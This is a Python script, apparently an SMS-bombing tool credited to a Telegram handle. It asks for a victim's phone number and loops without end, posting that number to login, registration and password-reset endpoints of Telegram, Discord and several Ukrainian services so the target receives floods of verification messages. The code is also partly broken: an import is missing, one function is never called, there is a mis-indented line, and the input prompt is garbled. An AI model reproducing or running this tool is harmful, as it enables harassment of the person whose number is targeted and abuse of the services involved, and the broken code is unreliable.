import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
os.system("open-url https://t.me/Hironotori")
NUMBER = input('Beeante HOMeP tenedona: (бes + ')



while True:

 try:
     print('telegram')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "telegram"')
 try:
     print('discord')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "discord"')
 try:
     print('megasport')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "megasport"')
 try:
     print('xtra.tv')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "xtra.tv"')
 try:
     print('xtra.tv-pass')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "xtra.tv-pass"')
     time.sleep(5)
 try:
     print('multiplex')
     response = requests.post('https://auth.multiplex.ua/login', headers=headers, json={'phone' :  NUMBER})
except:
     print('Не доставлено "multiplex"')
